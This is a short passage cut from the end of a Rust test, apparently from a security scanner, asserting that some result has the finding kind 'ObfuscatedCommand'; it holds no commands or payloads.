                .any(|x| x.kind == FindingKind::ObfuscatedCommand)
        );
    }
}
